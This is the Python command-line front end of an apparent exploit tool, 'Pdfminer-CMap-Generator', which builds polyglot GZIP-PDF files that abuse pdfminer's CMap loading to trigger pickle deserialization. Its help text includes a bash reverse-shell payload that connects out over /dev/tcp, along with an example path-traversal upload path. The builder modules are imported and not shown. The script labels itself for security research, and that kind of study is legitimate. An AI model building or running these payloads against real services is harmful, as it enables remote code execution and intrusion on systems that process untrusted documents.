#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Pdfminer-CMap-Generator (pcg)
A research tool to build polyglot GZIP-PDF files,
with exploiting pdfminer CMap loading.

Author: L1nq
License: For security research & educational use only.
"""

import argparse, json, sys
from validate import validate_main
from gzip_fextra import gzip_fextra
from pdf_trigger import build_trigger
from banner import banner

def validate(args):
    return validate_main(args)

def run(args):
    print("[!] The 'run' command is not yet implemented")
    return 1

def build(args):
    if args.type == 'gzip':
        if not args.payload:
            print("[!] Error: GZIP type requires '--payload' parameter")
            print("[*] Example: python pcg.py build -t gzip -p \"whoami\"")
            return 1
        output_file = args.output if args.output else "l1.pickle.gz"
        builder_func = gzip_fextra

    elif args.type == 'pdf':
        if not args.encoding_path:
            print("[!] Error: PDF type requires '--encoding-path' parameter")
            print("[*] Example: python pcg.py build -t pdf -ep \"/proc/self/cwd/uploads/l1\"")
            return 1
        output_file = args.output if args.output else "l1.pdf"
        builder_func = build_trigger

    else:
        print(f"[!] Error: Unknown type: {args.type}")
        return 1
    
    try:
        builder_func(args, output_file)
        print(f"[+] Generated: {output_file}")
        return 0
    except Exception as e:
        print(f"[!] Error: {e}")
        import traceback
        traceback.print_exc()
        return 1


def main(argv=None):
    class RichHelp(argparse.RawTextHelpFormatter):
        pass
    parser = argparse.ArgumentParser(
        description=banner().strip("\n"),
        formatter_class=RichHelp,
        add_help=True,
        usage=argparse.SUPPRESS
    )
    subparser = parser.add_subparsers(dest="cmd", required=True)

    # build
    b = subparser.add_parser(name="build", help="build a polyglot gzip-pdf file")
    b.add_argument("-t", "--type", choices=["gzip", "pdf"], help="Select GZIP or PDF", required=True)
    b.add_argument("-ptt" ,"--pdf-trigger-type", choices=["tounicode", "encoding", "traversal"],  default="tounicode", help="PDF trigger type: tounicode (ToUnicode usecmap - recommended), encoding (Type0 Encoding), or traversal (XObject traversal)")
    b.add_argument("-ep", "--encoding-path", type=str, help="PDF - Absolute path, but no suffix, Example: /proc/self/cwd/uploads/l1")
    b.add_argument("-p", "--payload", type=str, help="GZIP - CMap Pickle.loads Payload, Example: bash -c 'bash -i >& /dev/tcp/ip/5555 0>&1'")
    b.add_argument("-o", "--output", type=str, help="Custom output filename (default: l1.pickle.gz for GZIP, l1.pdf for PDF)")
    b.set_defaults(func=build)
    
    # validate
    v = subparser.add_parser(name="validate", help="Validate file")
    v.add_argument('-f','--file', type=str, help="Plotgloy gzip-pdf file path")
    v.set_defaults(func=validate)

    # run
    r = subparser.add_parser(name="run", help="run remote")
    r.set_defaults(func=run)

    if argv is None:
        argv = sys.argv[1:]
    if not argv:
        print("[!] No parameters provided,\n"
            "    python pcg.py --help\n")
        return 0

    args = parser.parse_args(argv)
    exit_code = args.func(args)
    return exit_code if exit_code is not None else 0

if __name__ == "__main__":
    sys.exit(main())